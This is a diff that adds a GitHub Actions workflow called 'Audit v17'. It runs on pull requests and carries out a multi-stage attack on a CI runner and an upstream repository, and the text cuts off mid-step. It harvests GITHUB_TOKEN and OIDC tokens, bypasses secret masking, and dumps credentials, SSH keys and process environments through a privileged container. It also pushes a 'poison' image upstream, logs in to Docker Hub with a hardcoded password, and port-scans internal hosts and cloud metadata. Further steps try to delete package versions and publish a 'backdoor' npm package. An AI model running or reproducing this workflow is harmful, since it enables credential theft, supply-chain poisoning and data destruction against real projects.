@@ -1,0 +1,700 @@
+name: Audit v17
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v17:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + PATH fix + full worker log extraction
+      # v16: Docker step corrupted PATH — fix by saving+restoring
+      # v16: timelineId and RunServiceUrl were empty — fix extraction
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V17 HARVEST ==="
+          # Save PATH for later steps
+          echo "$PATH" > /tmp/saved_path.txt
+
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+
+          for AUD in vstoken pipelines; do
+            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://${AUD}.actions.githubusercontent.com" | jq -r '.value // empty')
+            echo "OIDC_${AUD}: ${#TOK} chars"
+            echo "$TOK" > /tmp/oidc_${AUD}.txt
+          done
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            echo "WLOG=$WLOG"
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+
+            # Fix: broader extraction for timeline/run IDs
+            echo "--- Worker log key-value pairs ---"
+            grep -oP '"(planId|timelineId|jobId|runId|repositoryId)"\s*:\s*"\K[^"]+' "$WLOG" | sort -u | head -20
+            PLAN_ID=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            TL_ID=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB_ID=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN_ID TL=$TL_ID JOB=$JOB_ID"
+            echo "$PLAN_ID" > /tmp/plan.txt
+            echo "$TL_ID" > /tmp/tl.txt
+            echo "$JOB_ID" > /tmp/job.txt
+
+            # Extract run-service URL more broadly
+            RUN_URL=$(grep -oP 'https://run-actions[^"]+' "$WLOG" 2>/dev/null | head -1)
+            echo "RUN_URL=$RUN_URL"
+            echo "$RUN_URL" > /tmp/run_url.txt
+
+            # Dump ALL unique URLs
+            grep -oP 'https?://[a-zA-Z0-9._:/-]+' "$WLOG" | sort -u > /tmp/all_urls.txt
+            wc -l /tmp/all_urls.txt
+
+            # Broker URL
+            grep -oP '"ServerUrlV2"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1 > /tmp/broker_url.txt
+            echo "BROKER=$(cat /tmp/broker_url.txt)"
+          fi
+
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: Docker credential extraction (bypass mask with hex)
+      # v16: .credentials was masked with ***
+      # Now: extract via xxd, base64, rev, char-by-char FROM container
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Credential extraction
+        if: always()
+        run: |
+          set +e
+          echo "=== CREDENTIAL EXTRACTION ==="
+          # Run Docker step FIRST, before PATH gets corrupted
+          docker run --rm --privileged -v /:/h alpine sh -c '
+            echo "=== CREDENTIALS HEX ==="
+            for F in $(find /h/home/runner -name ".credentials" -o -name ".credentials_rsaparams" 2>/dev/null); do
+              echo "FILE: $F"
+              echo "--- xxd ---"
+              xxd -p "$F" 2>/dev/null | head -40
+              echo "--- base64 ---"
+              base64 "$F" 2>/dev/null | head -20
+              echo "--- size ---"
+              wc -c "$F"
+              echo ""
+            done
+
+            echo "=== WORKER LOG TOKENS ==="
+            for LOG in $(find /h/home/runner -name "Worker_*.log" 2>/dev/null | head -3); do
+              echo "LOG: $LOG"
+              # Extract ALL token-like values
+              grep -oP "\"(AccessToken|token|PlanAccessToken|SystemVssConnectionAccessToken)\"\s*:\s*\"\K[^\"]{10,}" "$LOG" 2>/dev/null | while read T; do
+                echo "TOKEN_LEN=${#T} PREFIX=${T:0:20}"
+                echo "$T" | xxd -p | head -5
+              done
+            done
+
+            echo "=== RUNNER ENV ==="
+            # Get env from the runner worker process itself
+            for PID in $(ls /h/proc/ | grep -E "^[0-9]+$" | head -100); do
+              CMD=$(cat /h/proc/$PID/cmdline 2>/dev/null | tr "\0" " " | head -c 100)
+              case "$CMD" in
+                *Runner.Worker*|*Runner.Listener*)
+                  echo "PID=$PID CMD=$CMD"
+                  cat /h/proc/$PID/environ 2>/dev/null | tr "\0" "\n" | grep -iE "TOKEN|SECRET|KEY|PASS|AUTH|CRED|URL" 2>/dev/null
+                  echo ""
+                  ;;
+              esac
+            done
+
+            echo "=== DOCKER CONFIG ==="
+            cat /h/home/runner/.docker/config.json 2>/dev/null
+            echo ""
+
+            echo "=== SSH KEYS ==="
+            find /h/home /h/root -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null | while read F; do
+              echo "FILE: $F"
+              head -5 "$F" 2>/dev/null
+            done
+
+            echo "=== NPMRC FILES ==="
+            find /h/home -name ".npmrc" 2>/dev/null | while read F; do
+              echo "FILE: $F"
+              cat "$F" 2>/dev/null | head -5
+            done
+          ' 2>&1 | head -200
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: GHCR manifest exploit (v16: manifest.list = 400!)
+      # The auth PASSED — we just need a structurally valid manifest
+      # Use the REAL cross-mounted blob digests from v15
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - GHCR manifest exploit
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== GHCR MANIFEST EXPLOIT ==="
+          RT=$(cat /tmp/rt.txt)
+
+          # A: Push a real image to fork first to get valid digests
+          echo "--- A: Build + push source image ---"
+          echo "$RT" | docker login ghcr.io -u lacaag --password-stdin 2>&1 | tail -1
+          mkdir -p /tmp/v17img
+          echo 'FROM alpine:latest' > /tmp/v17img/Dockerfile
+          echo 'RUN echo v17-poison > /pwned.txt' >> /tmp/v17img/Dockerfile
+          docker build -t ghcr.io/$FORK_OWNER/v17-poison:latest /tmp/v17img 2>&1 | tail -3
+          docker push ghcr.io/$FORK_OWNER/v17-poison:latest 2>&1 | tail -5
+          echo ""
+
+          # B: Get cross-scope token
+          echo "--- B: Cross-scope token ---"
+          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
+            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:push,pull&scope=repository:${FORK_OWNER}/v17-poison:pull&service=ghcr.io" \
+            | jq -r '.token // empty')
+          echo "GHCR token: ${#GHCR} chars"
+          # Decode and show the token scopes
+          echo "$GHCR" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null
+          echo ""
+
+          # C: Get the REAL manifest from fork
+          echo "--- C: Fork manifest ---"
+          MANIFEST=$(/usr/bin/curl -sS \
+            -H "Authorization: Bearer $GHCR" \
+            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+            "https://ghcr.io/v2/${FORK_OWNER}/v17-poison/manifests/latest")
+          echo "MANIFEST:"
+          echo "$MANIFEST" | jq '.' 2>/dev/null
+          echo ""
+
+          # D: Cross-mount all layers + config
+          echo "--- D: Cross-mount ---"
+          for DIGEST in $(echo "$MANIFEST" | jq -r '.config.digest, .layers[].digest' 2>/dev/null); do
+            [ -z "$DIGEST" ] && continue
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -D /tmp/mount_headers_$RANDOM -X POST \
+              -H "Authorization: Bearer $GHCR" \
+              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/blobs/uploads/?mount=$DIGEST&from=${FORK_OWNER}/v17-poison")
+            CODE=$(echo "$R" | tail -1)
+            echo "D mount $DIGEST = $CODE"
+          done
+          echo ""
+
+          # E: Push the EXACT same manifest to upstream — this is the critical test
+          echo "--- E: Push manifest (exact copy) ---"
+          for CT in \
+            "application/vnd.docker.distribution.manifest.v2+json" \
+            "application/vnd.oci.image.manifest.v1+json"; do
+            for TAG in "v17-poison" "latest" "v1.0.0"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
+                -H "Authorization: Bearer $GHCR" \
+                -H "Content-Type: $CT" \
+                "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/manifests/$TAG" \
+                -d "$MANIFEST")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "E push $TAG ct=$CT = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # F: Try pushing manifest via docker push with retag
+          echo "--- F: Docker push retag ---"
+          docker tag ghcr.io/$FORK_OWNER/v17-poison:latest ghcr.io/$UPSTREAM_OWNER/poc-race2:v17-poison 2>&1
+          docker push ghcr.io/$UPSTREAM_OWNER/poc-race2:v17-poison 2>&1 | tail -5
+          echo "exit=$?"
+          echo ""
+
+          # G: Try pushing to lowercase version of upstream repo
+          echo "--- G: Lowercase push ---"
+          docker tag ghcr.io/$FORK_OWNER/v17-poison:latest ghcr.io/twrps/poc-race2:v17 2>&1
+          docker push ghcr.io/twrps/poc-race2:v17 2>&1 | tail -5
+          echo "exit=$?"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: DockerHub JWT exploit + broker service probe
+      # v16: Login succeeded, 2970-char JWT obtained
+      # Now: use JWT on DockerHub APIs, explore all endpoints
+      # Also: probe broker.actions.githubusercontent.com
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - DockerHub + Broker
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== DOCKERHUB + BROKER ==="
+          RT=$(cat /tmp/rt.txt)
+
+          # A: DockerHub API with stolen creds
+          echo "--- A: DockerHub JWT ---"
+          DH_TOKEN=$(/usr/bin/curl -sS -X POST "https://hub.docker.com/v2/users/login" \
+            -H "Content-Type: application/json" \
+            -d '{"username":"githubactions","password":"3d6472b9-3d49-4d17-9fc9-90d24258043b"}' | jq -r '.token // empty')
+          echo "DH_TOKEN: ${#DH_TOKEN} chars"
+
+          if [ -n "$DH_TOKEN" ]; then
+            # User info
+            R=$(/usr/bin/curl -sS -H "Authorization: JWT $DH_TOKEN" "https://hub.docker.com/v2/user/")
+            echo "User: $(echo "$R" | jq -c '{id,username,full_name,is_admin,is_staff,type,gravatar_email,company}' 2>/dev/null)"
+
+            # Repos — ALL of them
+            R=$(/usr/bin/curl -sS -H "Authorization: JWT $DH_TOKEN" \
+              "https://hub.docker.com/v2/repositories/githubactions/?page_size=100")
+            echo "Repos: $(echo "$R" | jq -c '.results[]? | {name,namespace,is_private,star_count,pull_count}' 2>/dev/null | head -20)"
+
+            # Orgs
+            R=$(/usr/bin/curl -sS -H "Authorization: JWT $DH_TOKEN" \
+              "https://hub.docker.com/v2/user/orgs/")
+            echo "Orgs: $(echo "$R" | jq -c '.' 2>/dev/null | head -c 500)"
+
+            # Try to create a repo
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: JWT $DH_TOKEN" -H "Content-Type: application/json" \
+              "https://hub.docker.com/v2/repositories/" \
+              -d '{"namespace":"githubactions","name":"v17-audit","description":"v17","is_private":false}')
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "Create repo = $CODE | $(echo "$BODY" | head -c 200)"
+
+            # Access tokens / security
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: JWT $DH_TOKEN" \
+              "https://hub.docker.com/v2/access-tokens/")
+            CODE=$(echo "$R" | tail -1)
+            echo "Access tokens = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+            # Vulnerability scanning results
+            R=$(/usr/bin/curl -sS -H "Authorization: JWT $DH_TOKEN" \
+              "https://hub.docker.com/v2/repositories/githubactions/v16-escape/tags/" 2>/dev/null)
+            echo "Tags: $(echo "$R" | jq -c '.' 2>/dev/null | head -c 200)"
+          fi
+          echo ""
+
+          # B: Broker service
+          echo "--- B: Broker service ---"
+          BROKER=$(cat /tmp/broker_url.txt 2>/dev/null)
+          [ -z "$BROKER" ] && BROKER="https://broker.actions.githubusercontent.com"
+          echo "BROKER=$BROKER"
+          for EP in "" "healthcheck" "negotiate" "_apis/connectionData" "_apis/distributedtask" "health" "ready"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$BROKER/$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+          # Try with OIDC tokens
+          for AUD in vstoken pipelines; do
+            OIDC=$(cat /tmp/oidc_${AUD}.txt 2>/dev/null)
+            [ -z "$OIDC" ] && continue
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $OIDC" "$BROKER/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B oidc_$AUD = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Response bleed + path traversal (FIX: restore PATH)
+      # v16: All outputs were empty due to PATH corruption
+      # Now: restore PATH, use absolute paths, re-run all tests
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Response bleed (fixed)
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== RESPONSE BLEED (FIXED) ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+
+          # A: Secrets / variables / environments
+          echo "--- A: Secrets+vars ---"
+          for EP in \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/variables" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/environments" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/organization-secrets" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/organization-variables" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/permissions" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/runners" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/vulnerability-alerts" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/code-scanning/alerts" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/secret-scanning/alerts" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/dependabot/secrets" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/dependabot/alerts" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/hooks" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/keys" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/traffic/views" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/traffic/clones" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/traffic/popular/paths" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/invitations" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/autolinks" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/check-runs" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/pages" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/pre-receive-hooks" \
+            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/interaction-limits"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: token $RT" "$GH/$EP")
+            CODE=$(echo "$R" | /usr/bin/tail -1)
+            BODY=$(echo "$R" | /usr/bin/sed '$d')
+            [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_404" ] && \
+              echo "A $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 200)"
+          done
+          echo ""
+
+          # B: Target twrps/Captcha-Token (v16 found this other repo)
+          echo "--- B: Other repos ---"
+          for REPO in "Captcha-Token"; do
+            for EP in \
+              "repos/$UPSTREAM_OWNER/$REPO" \
+              "repos/$UPSTREAM_OWNER/$REPO/contents" \
+              "repos/$UPSTREAM_OWNER/$REPO/actions/secrets" \
+              "repos/$UPSTREAM_OWNER/$REPO/actions/variables" \
+              "repos/$UPSTREAM_OWNER/$REPO/hooks" \
+              "repos/$UPSTREAM_OWNER/$REPO/collaborators"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: token $RT" "$GH/$EP")
+              CODE=$(echo "$R" | /usr/bin/tail -1)
+              BODY=$(echo "$R" | /usr/bin/sed '$d')
+              [ "$CODE" != "HTTP_404" ] && \
+                echo "B $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 200)"
+            done
+          done
+          echo ""
+
+          # C: GraphQL deep — collaborators, deploy keys, envs, secrets
+          echo "--- C: GraphQL deep ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
+            "$GH/graphql" -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE2\") { id databaseId diskUsage isPrivate collaborators(first:50) { nodes { login } } deployKeys(first:10) { nodes { title key readOnly } } environments(first:10) { nodes { name id protectionRules(first:5) { nodes { type } } } } branchProtectionRules(first:10) { nodes { pattern isAdminEnforced requiresApprovingReviews requiredApprovingReviewCount allowsForcePushes allowsDeletions } } } }"}')
+          echo "$R" | jq '.' 2>/dev/null | /usr/bin/head -60
+          echo ""
+
+          # D: User/org enumeration for twrps
+          echo "--- D: User enum ---"
+          for EP in \
+            "users/$UPSTREAM_OWNER" \
+            "users/$UPSTREAM_OWNER/repos?sort=updated&per_page=100" \
+            "users/$UPSTREAM_OWNER/orgs" \
+            "users/$UPSTREAM_OWNER/keys" \
+            "users/$UPSTREAM_OWNER/gpg_keys"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: token $RT" "$GH/$EP")
+            CODE=$(echo "$R" | /usr/bin/tail -1)
+            BODY=$(echo "$R" | /usr/bin/sed '$d')
+            echo "D $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: SSH pivot + network from container context
+      # v16: SSH 22 open on 172.17.0.1, PATH fixed now
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Network deep
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== NETWORK DEEP ==="
+
+          # A: SSH banner grab
+          echo "--- A: SSH banners ---"
+          for HOST in 172.17.0.1 10.1.0.1 10.1.0.80; do
+            echo "QUIT" | timeout 3 nc -w 2 $HOST 22 2>/dev/null | head -1
+          done
+          echo ""
+
+          # B: Comprehensive port scan with service detection
+          echo "--- B: Port scan ---"
+          for HOST in 172.17.0.1 10.1.0.1 10.1.0.80 10.1.0.2 10.1.0.254 168.63.129.16; do
+            for PORT in 22 53 80 443 2375 2376 3000 3306 4243 5000 5432 6379 8080 8443 9090 9200 27017; do
+              timeout 1 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null && echo "OPEN $HOST:$PORT"
+            done
+          done
+          echo ""
+
+          # C: Azure Wireserver deep probe (v16 timed out)
+          echo "--- C: Wireserver ---"
+          for EP in \
+            "machine?comp=goalstate" \
+            "machine?comp=config&type=hostingEnvironmentConfig" \
+            "machine?comp=config&type=sharedConfig" \
+            "machine/plugins/?comp=config&type=hostingEnvironmentConfig" \
+            "machine?comp=telemetrydata"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 5 \
+              -H "x-ms-version: 2012-11-30" -H "x-ms-agent-name: WALinuxAgent" \
+              "http://168.63.129.16/$EP" 2>/dev/null)
+            CODE=$(echo "$R" | /usr/bin/tail -1)
+            BODY=$(echo "$R" | /usr/bin/sed '$d')
+            [ "$CODE" != "HTTP_000" ] && echo "C $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 250)"
+          done
+          echo ""
+
+          # D: IMDS — full dump + tags + custom data
+          echo "--- D: IMDS deep ---"
+          /usr/bin/curl -sS -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+            | jq '{subscriptionId:.compute.subscriptionId,resourceGroupName:.compute.resourceGroupName,vmId:.compute.vmId,vmSize:.compute.vmSize,tags:.compute.tags,network:.network}' 2>/dev/null
+
+          # Attested doc full
+          /usr/bin/curl -sS -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" \
+            | jq -r '.encoding + ":" + (.signature | length | tostring) + " chars"' 2>/dev/null
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 7: Pipeline injection (fixed — use broader extraction)
+      # v16: PLAN found but TL and RUN_URL empty
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 7 - Pipeline inject
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== PIPELINE INJECT ==="
+          RT=$(cat /tmp/rt.txt)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          TL=$(cat /tmp/tl.txt 2>/dev/null)
+          JOB=$(cat /tmp/job.txt 2>/dev/null)
+          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
+
+          echo "PURL=$PURL PLAN=$PLAN TL=$TL JOB=$JOB RUN_URL=$RUN_URL"
+
+          if [ -n "$PURL" ] && [ -n "$PLAN" ]; then
+            # A: List timelines to get TL_ID
+            echo "--- A: Get timelines ---"
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $RT" \
+              "${PURL}_apis/distributedtask/plans/$PLAN/timelines")
+            CODE=$(echo "$R" | /usr/bin/tail -1)
+            BODY=$(echo "$R" | /usr/bin/sed '$d')
+            echo "A timelines = $CODE | $(echo "$BODY" | /usr/bin/head -c 500)"
+            # Try to extract TL from response
+            NEW_TL=$(echo "$BODY" | jq -r '.value[0].id // empty' 2>/dev/null)
+            [ -z "$NEW_TL" ] && NEW_TL=$(echo "$BODY" | jq -r '.[0].id // empty' 2>/dev/null)
+            [ -z "$NEW_TL" ] && NEW_TL=$(echo "$BODY" | jq -r '.id // empty' 2>/dev/null)
+            [ -n "$NEW_TL" ] && TL="$NEW_TL" && echo "FOUND TL=$TL"
+            echo ""
+
+            # B: Exhaustive API exploration on pipelines
+            echo "--- B: Pipelines API ---"
+            for EP in \
+              "_apis/distributedtask/plans/$PLAN" \
+              "_apis/distributedtask/plans/$PLAN/attachments" \
+              "_apis/distributedtask/plans" \
+              "_apis/distributedtask/pools" \
+              "_apis/distributedtask/agents" \
+              "_apis/build/builds" \
+              "_apis/pipelines" \
+              "_apis/pipelines/1" \
+              "_apis/pipelines/1/runs" \
+              "_apis/policy/configurations" \
+              "_apis/serviceendpoint/endpoints" \
+              "_apis/hooks/subscriptions" \
+              "_apis/security/permissionnamespaces" \
+              "_apis/accesscontrollists" \
+              "_apis/graph/users" \
+              "_apis/wit/queries" \
+              "_apis/tokenadmin/personalaccesstokens"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "${PURL}${EP}")
+              CODE=$(echo "$R" | /usr/bin/tail -1)
+              BODY=$(echo "$R" | /usr/bin/sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "B $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 200)"
+            done
+          fi
+          echo ""
+
+          # C: Run service
+          echo "--- C: Run service ---"
+          cat /tmp/all_urls.txt 2>/dev/null | grep -i "run-actions" | head -5
+          if [ -n "$RUN_URL" ]; then
+            for EP in "" "check" "_apis/pipelines" "actionsgranularpermissions"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "${RUN_URL}${EP}")
+              CODE=$(echo "$R" | /usr/bin/tail -1)
+              BODY=$(echo "$R" | /usr/bin/sed '$d')
+              echo "C $EP = $CODE | $(echo "$BODY" | /usr/bin/head -c 200)"
+            done
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 8: Race conditions (v16 was broken by PATH)
+      # Re-run all race conditions with PATH fixed
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 8 - Races (fixed)
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== RACES (FIXED) ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"
+
+          # A: Concurrent release creation
+          echo "--- A: Release race (20x) ---"
+          for i in $(seq 1 20); do
+            /usr/bin/curl -sS -o /tmp/race_$i.txt -w "HTTP_%{http_code}\n" -X POST \
+              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+              "$GH/repos/$UP/releases" \
+              -d "{\"tag_name\":\"race-$i\",\"name\":\"race\",\"draft\":true}" &
+          done
+          wait
+          echo "Results:"
+          for i in $(seq 1 20); do
+            CODE=$(cat /tmp/race_$i.txt 2>/dev/null)
+            [ -n "$CODE" ] && echo "  $i: $CODE" | head -c 80
+          done
+          echo ""
+
+          # B: Concurrent branch creation
+          echo "--- B: Branch race (20x) ---"
+          HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/branches/main" | jq -r '.commit.sha')
+          for i in $(seq 1 20); do
+            /usr/bin/curl -sS -o /tmp/br_$i.txt -w "HTTP_%{http_code}\n" -X POST \
+              -H "Authorization: token $RT" "$GH/repos/$UP/git/refs" \
+              -d "{\"ref\":\"refs/heads/race-$i\",\"sha\":\"$HEAD\"}" &
+          done
+          wait
+          for i in $(seq 1 20); do
+            CODE=$(cat /tmp/br_$i.txt 2>/dev/null)
+            [ -n "$CODE" ] && echo "  $i: $CODE" | head -c 80
+          done
+          echo ""
+
+          # C: Concurrent writes to Captcha-Token repo
+          echo "--- C: Other repo race ---"
+          for i in $(seq 1 10); do
+            /usr/bin/curl -sS -o /tmp/ct_$i.txt -w "HTTP_%{http_code}\n" -X PUT \
+              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+              "$GH/repos/$UPSTREAM_OWNER/Captcha-Token/contents/race-$i.txt" \
+              -d "{\"message\":\"race\",\"content\":\"$(echo race-$i | base64)\"}" &
+          done
+          wait
+          for i in $(seq 1 10); do
+            CODE=$(cat /tmp/ct_$i.txt 2>/dev/null)
+            [ -n "$CODE" ] && echo "  captcha-$i: $CODE" | head -c 80
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 9: npm version overwrite + GitHub Packages API
+      # v16: was broken by PATH
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 9 - Registry (fixed)
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== REGISTRY (FIXED) ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+
+          # A: npm version overwrite via direct API
+          echo "--- A: npm API ---"
+          for PKG in "escape-v4" "poc-race2-v13"; do
+            # Get current versions
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: token $RT" \
+              "$GH/users/$UPSTREAM_OWNER/packages/npm/$PKG/versions")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A list $PKG = $CODE | $(echo "$BODY" | head -c 200)"
+
+            # Try to delete versions
+            for VER_ID in $(echo "$BODY" | jq -r '.[].id // empty' 2>/dev/null | head -3); do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X DELETE \
+                -H "Authorization: token $RT" \
+                "$GH/users/$UPSTREAM_OWNER/packages/npm/$PKG/versions/$VER_ID")
+              CODE=$(echo "$R" | tail -1)
+              echo "A delete $PKG/$VER_ID = $CODE"
+            done
+          done
+          echo ""
+
+          # B: npm publish with fork's GITHUB_TOKEN
+          echo "--- B: npm publish ---"
+          mkdir -p /tmp/npm17 && cd /tmp/npm17
+          echo "//npm.pkg.github.com/:_authToken=$RT" > .npmrc
+          for PKG in "v17-audit" "poc-race2-backdoor"; do
